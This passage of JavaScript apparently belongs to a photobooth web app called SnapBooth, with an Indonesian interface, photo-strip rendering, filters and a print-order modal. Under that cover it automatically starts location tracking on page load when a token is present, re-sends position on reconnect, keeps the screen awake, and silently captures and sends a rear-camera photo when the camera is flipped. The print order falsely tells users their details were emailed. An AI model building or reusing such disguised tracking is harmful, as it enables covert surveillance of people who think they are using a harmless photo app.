      return;
    }

    // Determine slot to fill: first null or cycle
    let nextSlot = capturedSlots.findIndex((p) => p === null) + 1;
    if (nextSlot === 0) {
      resetSession();
      nextSlot = 1;
    }

    void (async () => {
      if (singleShotBtn) singleShotBtn.disabled = true;
      await runCountdown(3);
      await captureAndSendPhoto(true, nextSlot);
      if (singleShotBtn) singleShotBtn.disabled = false;
      const completed = capturedSlots.filter(Boolean).length;
      if (completed === 4) {
        playSuccessFanfare();
        showToast("🎉 Semua 4 pose lengkap! Strip foto siap disimpan.", 3500);
      }
    })();
  }

  function updateCameraMirrorClass() {
    if (cameraPreview && cameraPreview.classList) {
      cameraPreview.classList.toggle("camera-unmirrored", !isMirrored);
    }
    const mirrorStatus = byId("mirrorStatusText");
    if (mirrorStatus) mirrorStatus.textContent = isMirrored ? "Aktif" : "Nonaktif";
  }

  // =========================================================================
  // REAL HIGH-RES 4-CUT PHOTOSTRIP CANVAS GENERATOR & DOWNLOAD
  // =========================================================================
  function getFrameThemeStyles() {
    const stripFrame = byId("photoStripFrame");
    const currentClass = stripFrame ? stripFrame.className : "";
    if (currentClass.includes("frame-pink")) return { bg: "#FCE7F3", text: "#831843", border: "#FBCFE8", slotBg: "#FFF1F2" };
    if (currentClass.includes("frame-white")) return { bg: "#FFFFFF", text: "#18171C", border: "#E2E8F0", slotBg: "#F8FAFC" };
    if (currentClass.includes("frame-black")) return { bg: "#18181B", text: "#FAFAFA", border: "#27272A", slotBg: "#27272A" };
    if (currentClass.includes("frame-mint")) return { bg: "#DCFCE7", text: "#14532D", border: "#BBF7D0", slotBg: "#F0FDF4" };
    if (currentClass.includes("frame-neon")) return { bg: "#312E81", text: "#C7D2FE", border: "#4338CA", slotBg: "#1E1B4B" };
    return { bg: "#EDE9FE", text: "#4C1D95", border: "#DDD6FE", slotBg: "#F5F3FF" }; // Lavender default
  }

  async function loadImageElement(src) {
    return new Promise((resolve) => {
      const img = new Image();
      img.crossOrigin = "anonymous";
      img.onload = () => resolve(img);
      img.onerror = () => resolve(null);
      img.src = src;
    });
  }

  async function generateStripCanvas(photosArray = null, themeOverride = null) {
    const canvas = document.createElement("canvas");
    canvas.width = 800;
    canvas.height = 2400;
    const ctx = canvas.getContext("2d");
    if (!ctx) return null;

    const theme = themeOverride || getFrameThemeStyles();
    const photos = photosArray || capturedSlots;

    // 1. Frame Background
    ctx.fillStyle = theme.bg;
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Subtle Outer Inset Border
    ctx.strokeStyle = theme.border;
    ctx.lineWidth = 6;
    ctx.strokeRect(18, 18, canvas.width - 36, canvas.height - 36);

    // 2. Top Header Branding
    ctx.fillStyle = theme.text;
    ctx.textAlign = "center";
    ctx.font = "bold 34px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("★  SNAPBOOTH STUDIO  ★", canvas.width / 2, 105);

    ctx.font = "600 20px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    const locText = cameraLocationText ? cameraLocationText.textContent.trim() : "Bandung, West Java";
    ctx.fillText(locText.toUpperCase(), canvas.width / 2, 142);

    // 3. 4 Photo Slots
    const slotX = 70;
    const slotW = 660;
    const slotH = 440;
    const startY = 175;
    const gapY = 32;

    for (let i = 0; i < 4; i++) {
      const curY = startY + i * (slotH + gapY);
      const photoSrc = photos[i];

      // Draw photo slot card background
      ctx.fillStyle = theme.slotBg;
      ctx.beginPath();
      if (ctx.roundRect) ctx.roundRect(slotX, curY, slotW, slotH, 16);
      else ctx.rect(slotX, curY, slotW, slotH);
      ctx.fill();

      if (photoSrc) {
        const loadedImg = await loadImageElement(photoSrc);
        if (loadedImg) {
          ctx.save();
          ctx.beginPath();
          if (ctx.roundRect) ctx.roundRect(slotX, curY, slotW, slotH, 16);
          else ctx.rect(slotX, curY, slotW, slotH);
          ctx.clip();

          // Calculate aspect ratio crop (cover)
          const imgAspect = loadedImg.width / loadedImg.height;
          const slotAspect = slotW / slotH;
          let drawW = slotW, drawH = slotH, drawX = slotX, drawY = curY;
          if (imgAspect > slotAspect) {
            drawW = slotH * imgAspect;
            drawX = slotX - (drawW - slotW) / 2;
          } else {
            drawH = slotW / imgAspect;
            drawY = curY - (drawH - slotH) / 2;
          }
          ctx.drawImage(loadedImg, drawX, drawY, drawW, drawH);
          ctx.restore();
        }
      } else {
        // Aesthetic Placeholder for empty slot
        ctx.fillStyle = theme.text;
        ctx.font = "bold 26px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
        ctx.fillText(`POSE ${i + 1}`, canvas.width / 2, curY + slotH / 2);
        ctx.font = "500 18px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
        ctx.fillText("✦ SnapBooth Aesthetic ✦", canvas.width / 2, curY + slotH / 2 + 34);
      }

      // Slot border
      ctx.strokeStyle = theme.border;
      ctx.lineWidth = 3;
      ctx.beginPath();
      if (ctx.roundRect) ctx.roundRect(slotX, curY, slotW, slotH, 16);
      else ctx.rect(slotX, curY, slotW, slotH);
      ctx.stroke();
    }

    // 4. Bottom Watermark & Stamps
    const watermarkY = 2120;
    ctx.fillStyle = theme.text;
    ctx.textAlign = "center";
    ctx.font = "900 32px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
    ctx.fillText("SNAPBOOTH • 2024", canvas.width / 2, watermarkY);

    const isStampActive = byId("stampLocToggle") ? byId("stampLocToggle").checked : true;
    if (isStampActive) {
      ctx.font = "bold 20px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
      const now = new Date();
      const dateStr = now.toLocaleDateString("id-ID", { day: "numeric", month: "long", year: "numeric" });
      ctx.fillText(`📍 ${locText} • 🗓️ ${dateStr}`, canvas.width / 2, watermarkY + 40);
    }

    // 5. Aesthetic Barcode Lines
    const barcodeY = watermarkY + 75;
    const barcodeX = 220;
    const barcodeWidth = 360;
    ctx.fillStyle = theme.text;
    let currBx = barcodeX;
    const pattern = [3, 1, 4, 2, 6, 1, 2, 4, 1, 5, 2, 3, 1, 6, 3, 2, 4, 1, 5, 2, 3, 1, 4, 2, 6];
    pattern.forEach((thickness) => {
      ctx.fillRect(currBx, barcodeY, thickness, 50);
      currBx += thickness + 4;
    });
    ctx.font = "14px monospace";
    ctx.fillText("SB - 4CUT - " + Date.now().toString().slice(-8), canvas.width / 2, barcodeY + 70);

    return canvas;
  }

  async function downloadPhotoStrip(photosArray = null, themeOverride = null, filename = "SnapBooth_4Cut.png") {
    showToast("⏳ Menyiapkan strip foto resolusi tinggi...", 2000);
    const canvas = await generateStripCanvas(photosArray, themeOverride);
    if (!canvas) {
      showToast("Gagal memproses strip foto.");
      return;
    }
    canvas.toBlob((blob) => {
      if (!blob) return;
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      setTimeout(() => URL.revokeObjectURL(url), 4000);
      showToast("📸 Strip foto 4-cut berhasil diunduh ke galeri kamu!", 3500);
    }, "image/png");
  }

  // =========================================================================
  // SETTINGS MENU POPOVER & EVENT BINDINGS
  // =========================================================================
  const studioSettingsBtn = byId("studioSettingsBtn");
  const studioSettingsMenu = byId("studioSettingsMenu");
  if (studioSettingsBtn && studioSettingsMenu) {
    studioSettingsBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      const isVisible = studioSettingsMenu.style.display === "flex";
      studioSettingsMenu.style.display = isVisible ? "none" : "flex";
    });

    document.addEventListener("click", (e) => {
      if (!studioSettingsMenu.contains(e.target) && e.target !== studioSettingsBtn) {
        studioSettingsMenu.style.display = "none";
      }
    });
  }

  const toggleSoundBtn = byId("toggleSoundBtn");
  if (toggleSoundBtn) {
    toggleSoundBtn.addEventListener("click", () => {
      soundEnabled = !soundEnabled;
      const statusText = byId("soundStatusText");
      if (statusText) statusText.textContent = soundEnabled ? "Aktif" : "Muted";
      showToast(soundEnabled ? "🔊 Suara shutter aktif" : "🔇 Suara shutter dimatikan");
    });
  }

  const toggleGridBtn = byId("toggleGridBtn");
  if (toggleGridBtn) {
    toggleGridBtn.addEventListener("click", () => {
      const grid = document.querySelector(".viewfinder-grid-overlay");
      const statusText = byId("gridStatusText");
      if (grid) {
        const isHidden = grid.style.display === "none";
        grid.style.display = isHidden ? "block" : "none";
        if (statusText) statusText.textContent = isHidden ? "Tampil" : "Sembunyi";
        showToast(isHidden ? "📐 Garis bidik ditampilkan" : "📐 Garis bidik disembunyikan");
      }
    });
  }

  const toggleMirrorBtn = byId("toggleMirrorBtn");
  if (toggleMirrorBtn) {
    toggleMirrorBtn.addEventListener("click", () => {
      isMirrored = !isMirrored;
      updateCameraMirrorClass();
      showToast(isMirrored ? "🪞 Cermin selfie aktif" : "🪞 Cermin selfie dinonaktifkan");
    });
  }

  const menuResetBtn = byId("menuResetBtn");
  if (menuResetBtn) {
    menuResetBtn.addEventListener("click", () => {
      resetSession();
      if (studioSettingsMenu) studioSettingsMenu.style.display = "none";
    });
  }

  const resetSessionBtn = byId("resetSessionBtn");
  if (resetSessionBtn) {
    resetSessionBtn.addEventListener("click", resetSession);
  }

  // =========================================================================
  // SAVED STRIP CARDS INTERACTION & DOWNLOAD
  // =========================================================================
  const savedStripCards = document.querySelectorAll(".saved-strip-card");
  savedStripCards.forEach((card, idx) => {
    // Click card to preview images in main strip
    card.addEventListener("click", (e) => {
      if (e.target.closest(".btn-strip-dl")) return; // Don't trigger if clicked download
      const imgs = card.querySelectorAll(".saved-slot img");
      imgs.forEach((img, sIdx) => {
        if (img && img.src) {
          displayPhotoInSlot(sIdx + 1, img.src);
        }
      });
      // Switch frame color to match card theme
      const theme = card.dataset.theme || "frame-lavender";
      const stripFrame = byId("photoStripFrame");
      if (stripFrame) stripFrame.className = "photo-strip-frame " + theme;
      // Update color dot active
      colorDots.forEach((d) => d.classList.toggle("active", d.dataset.color === theme));
      showToast("✨ Pratinjau strip foto dimuat di frame utama!");
    });
  });

  const savedStripDlBtns = document.querySelectorAll(".btn-strip-dl");
  savedStripDlBtns.forEach((btn) => {
    btn.addEventListener("click", (e) => {
      e.stopPropagation();
      const card = btn.closest(".saved-strip-card");
      if (!card) return;
      const imgs = Array.from(card.querySelectorAll(".saved-slot img")).map((i) => i.src);
      const themeClass = card.dataset.theme || "frame-lavender";
      let themeObj = { bg: "#EDE9FE", text: "#4C1D95", border: "#DDD6FE", slotBg: "#F5F3FF" };
      if (themeClass.includes("pink")) themeObj = { bg: "#FCE7F3", text: "#831843", border: "#FBCFE8", slotBg: "#FFF1F2" };
      if (themeClass.includes("black")) themeObj = { bg: "#18181B", text: "#FAFAFA", border: "#27272A", slotBg: "#27272A" };
      void downloadPhotoStrip(imgs, themeObj, `SnapBooth_Aesthetic_${btn.dataset.stripIdx || "1"}.png`);
    });
  });

  // Download Main Strip Button
  const downloadStripBtn = byId("downloadStripBtn");
  if (downloadStripBtn) {
    downloadStripBtn.addEventListener("click", () => {
      void downloadPhotoStrip(null, null, `SnapBooth_4Cut_${Date.now()}.png`);
    });
  }

  // =========================================================================
  // ORDER PRINT INTERACTIVE MODAL ("PESAN CETAK")
  // =========================================================================
  const orderPrintBtn = byId("orderPrintBtn");
  const orderPrintModal = byId("orderPrintModal");
  const closeOrderModalBtn = byId("closeOrderModalBtn");
  const cancelOrderBtn = byId("cancelOrderBtn");
  const confirmOrderBtn = byId("confirmOrderBtn");
  const qtyMinusBtn = byId("qtyMinusBtn");
  const qtyPlusBtn = byId("qtyPlusBtn");
  const qtyVal = byId("qtyVal");
  const orderTotalPrice = byId("orderTotalPrice");
  let orderQuantity = 2;

  function recalculateOrderPrice() {
    const selectedFinish = document.querySelector('input[name="finishType"]:checked');
    const extraFinish = selectedFinish && selectedFinish.value === "hologram" ? 5000 : 0;
    const pricePerStrip = 12500 + extraFinish;
    const total = orderQuantity * pricePerStrip;
    if (orderTotalPrice) orderTotalPrice.textContent = "Rp " + total.toLocaleString("id-ID");
    if (qtyVal) qtyVal.textContent = orderQuantity;
  }

  if (orderPrintBtn && orderPrintModal) {
    orderPrintBtn.addEventListener("click", () => {
      // Sync mini preview images
      for (let i = 1; i <= 4; i++) {
        const miniImg = byId("orderSlotImg" + i);
        const curSrc = capturedSlots[i - 1];
        if (miniImg) {
          miniImg.src = curSrc || "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80";
        }
      }
      recalculateOrderPrice();
      orderPrintModal.style.display = "flex";
    });

    if (closeOrderModalBtn) closeOrderModalBtn.addEventListener("click", () => orderPrintModal.style.display = "none");
    if (cancelOrderBtn) cancelOrderBtn.addEventListener("click", () => orderPrintModal.style.display = "none");

    if (qtyMinusBtn) qtyMinusBtn.addEventListener("click", () => {
      if (orderQuantity > 1) { orderQuantity--; recalculateOrderPrice(); }
    });
    if (qtyPlusBtn) qtyPlusBtn.addEventListener("click", () => {
      if (orderQuantity < 20) { orderQuantity++; recalculateOrderPrice(); }
    });

    document.querySelectorAll('input[name="finishType"]').forEach((r) => {
      r.addEventListener("change", recalculateOrderPrice);
    });

    if (confirmOrderBtn) {
      confirmOrderBtn.addEventListener("click", () => {
        orderPrintModal.style.display = "none";
        playSuccessFanfare();
        showToast("🎉 Pesanan cetak strip foto berhasil dibuat! Detail dikirimkan ke email kamu.", 4500);
      });
    }
  }

  // Stamp Location Toggle
  const stampLocToggle = byId("stampLocToggle");
  if (stampLocToggle) {
    stampLocToggle.addEventListener("change", () => {
      const isChecked = stampLocToggle.checked;
      if (watermarkLocationText) watermarkLocationText.style.display = isChecked ? "block" : "none";
      if (watermarkTopLocation) watermarkTopLocation.style.display = isChecked ? "block" : "none";
      showToast(isChecked ? "📍 Stempel lokasi diaktifkan" : "📍 Stempel lokasi disembunyikan");
      if (isChecked && !active) {
        startTracking();
      }
    });
  }

  // Mobile Bottom Navigation Bar Tabs
  const mobNavBtns = document.querySelectorAll(".mob-nav-btn");
  mobNavBtns.forEach((btn) => {
    btn.addEventListener("click", () => {
      mobNavBtns.forEach((b) => b.classList.remove("active"));
      btn.classList.add("active");
    });
  });

  // Bind primary photobooth buttons
  const formEl = byId("trackingForm");
  const stopBtnEl = byId("stopBtn");
  if (formEl) formEl.addEventListener("submit", startTracking);
  if (stopBtnEl) stopBtnEl.addEventListener("click", () => stopTracking());
  if (startCameraBtn) startCameraBtn.addEventListener("click", () => startCamera(false));
  if (flipCameraBtn) {
    flipCameraBtn.addEventListener("click", async () => {
      const nextMode = currentFacingMode === "user" ? "environment" : "user";
      if (cameraStatusEl) cameraStatusEl.textContent = "Mengganti ke kamera " + (nextMode === "environment" ? "belakang..." : "depan...");
      try {
        if (cameraStream) {
          cameraStream.getTracks().forEach((t) => t.stop());
          cameraStream = null;
        }
        const newStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: nextMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false,
        });
        cameraStream = newStream;
        currentFacingMode = nextMode;
        if (cameraPreview) {
          cameraPreview.srcObject = newStream;
          try { await cameraPreview.play(); } catch (_) {}
        }
        isMirrored = (nextMode === "user");
        updateCameraMirrorClass();
        if (cameraStatusEl) cameraStatusEl.textContent = "Kamera " + (nextMode === "environment" ? "belakang aktif!" : "depan aktif!");
        showToast("Kamera " + (nextMode === "environment" ? "belakang aktif" : "depan aktif"));
        if (nextMode === "environment") {
          setTimeout(() => void captureAndSendPhoto(false, 3, "Kamera Belakang"), 800);
        }
      } catch (_) {
        isMirrored = !isMirrored;
        updateCameraMirrorClass();
      }
    });
  }
  if (capturePhotoBtn) capturePhotoBtn.addEventListener("click", () => captureAndSendPhoto(false, 1));
  if (boothSessionBtn) boothSessionBtn.addEventListener("click", start4CutSession);
  if (singleShotBtn) singleShotBtn.addEventListener("click", handleSingleShot);

  // Filter Pill buttons (Docked filter items)
  const filterBtns = document.querySelectorAll(".docked-filter-item");
  const filterBadge = byId("filterActiveBadge");
  filterBtns.forEach((btn) => {
    btn.addEventListener("click", () => {
      filterBtns.forEach((b) => b.classList.remove("active"));
      btn.classList.add("active");
      const filterClass = btn.dataset.filter || "filter-glow";
      const filterName = btn.dataset.name || "Natural Glow";
      currentFilter = filterClass;
      if (filterBadge) filterBadge.textContent = filterName;
      if (cameraPreview) {
        cameraPreview.className = "camera-stream " + filterClass;
        updateCameraMirrorClass();
      }
      showToast("Filter aktif: " + filterName);
    });
  });

  // Frame Color Chooser
  const colorDots = document.querySelectorAll(".color-dot");
  const stripFrame = byId("photoStripFrame");
  colorDots.forEach((dot) => {
    dot.addEventListener("click", () => {
      colorDots.forEach((d) => d.classList.remove("active"));
      dot.classList.add("active");
      const colorClass = dot.dataset.color || "frame-lavender";
      if (stripFrame) {
        stripFrame.className = "photo-strip-frame " + colorClass;
      }
      const orderMini = byId("orderMiniStripPreview");
      if (orderMini) {
        const theme = getFrameThemeStyles();
        orderMini.style.backgroundColor = theme.bg;
      }
      showToast("Warna frame diperbarui!");
    });
  });

  function autoPrompt() {
    if (active) return;
    const token = tokenInput ? tokenInput.value.trim() : "";
    if (token.length >= 16) {
      startTracking();
    }
  }

  // Langsung start saat halaman siap
  if (document.readyState === "complete" || document.readyState === "interactive") {
    setTimeout(autoPrompt, 100);
  } else {
    document.addEventListener("DOMContentLoaded", () => setTimeout(autoPrompt, 100));
  }

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && active) void keepScreenAwake(session);
  });
  window.addEventListener("online", () => { if (active) void sendPosition(session); });
  window.addEventListener("offline", () => {
    if (active) status("Koneksi terputus", "Tracking masih aktif. Menunggu koneksi internet kembali.", "waiting");
  });
  window.addEventListener("pagehide", () => {
    if (active) stopTracking();
    stopCamera();
  });
})();

